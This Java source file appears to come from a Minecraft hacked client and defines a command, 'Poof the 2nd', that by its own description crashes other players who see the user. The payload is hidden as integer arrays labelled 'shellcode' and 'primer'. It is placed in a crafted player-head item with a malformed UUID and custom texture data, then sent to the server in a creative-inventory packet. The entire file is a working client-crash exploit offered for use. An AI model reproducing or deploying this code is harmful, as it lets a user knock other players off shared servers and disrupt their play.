package me.zeroX150.cornos.features.command.impl;

import me.zeroX150.cornos.Cornos;
import me.zeroX150.cornos.features.command.Command;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.IntArrayTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;

public class Poof2 extends Command {
    // primer
    int[] EID = new int[]{
            -0xB3CC7B,
            -0x50A2A2B,
            -0x47197C3,
            -0x50EE90A
    };
    // shellcode
    int[] BCO = new int[]{
            0x65, 0x79, 0x4a, 0x30, 0x5a, 0x58, 0x68, 0x30, 0x64, 0x58, 0x4a, 0x6c, 0x63, 0x79, 0x49, 0x36, 0x65, 0x79, 0x4a, 0x54, 0x53, 0x30, 0x6c, 0x4f, 0x49, 0x6a, 0x70, 0x37, 0x49, 0x6e, 0x56, 0x79, 0x62, 0x43, 0x49, 0x36, 0x49, 0x6d, 0x68, 0x30, 0x64, 0x48, 0x42, 0x7a, 0x4f, 0x69, 0x38, 0x76, 0x5a, 0x57, 0x52, 0x31, 0x59, 0x32, 0x46, 0x30, 0x61, 0x57, 0x39, 0x75, 0x4c, 0x6d, 0x31, 0x70, 0x62, 0x6d, 0x56, 0x6a, 0x63, 0x6d, 0x46, 0x6d, 0x64, 0x43, 0x35, 0x75, 0x5a, 0x58, 0x51, 0x76, 0x64, 0x33, 0x41, 0x74, 0x59, 0x32, 0x39, 0x75, 0x64, 0x47, 0x56, 0x75, 0x64, 0x43, 0x39, 0x31, 0x63, 0x47, 0x78, 0x76, 0x59, 0x57, 0x52, 0x7a, 0x4c, 0x7a, 0x46, 0x77, 0x65, 0x43, 0x35, 0x77, 0x62, 0x6d, 0x63, 0x69, 0x66, 0x58, 0x31, 0x39
    };
    // buffer
    int[] BCE = new int[]{
            0x61, 0x6d, 0x6f, 0x67, 0x75, 0x73, 0x53, 0x75, 0x73
    };

    public Poof2() {
        super("Poof the 2nd", "Crashes a player when he sees you, restarts the client and sees you again", new String[]{"poof", "poof2", "pf", "pf2"});
    }

    @Override
    public void onExecute(String[] args) {
        // convert int arrays to string
        StringBuilder EXPLOIT = new StringBuilder();
        StringBuilder E1 = new StringBuilder();
        for (int i : BCO) {
            EXPLOIT.append((char) i);
        }
        for (int i : BCE) {
            {
                E1.append((char) i);
            }
        }

        // create item stack with exploit
        ItemStack is = new ItemStack(Items.PLAYER_HEAD, 0x1);
        CompoundTag skullOwner = is.getOrCreateSubTag("SkullOwner");

        // put the funnies
        CompoundTag props = new CompoundTag();
        ListTag textures = new ListTag();
        CompoundTag texturesI1 = new CompoundTag();
        texturesI1.put("Value", StringTag.of(EXPLOIT.toString()));
        textures.add(texturesI1);
        props.put("textures", textures);
        props.put("Name", StringTag.of(E1.toString()));

        skullOwner.put("Id", new IntArrayTag(EID));
        skullOwner.put("Properties", props);

        // and let others see
        Cornos.minecraft.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(0x5, is));
    }
}
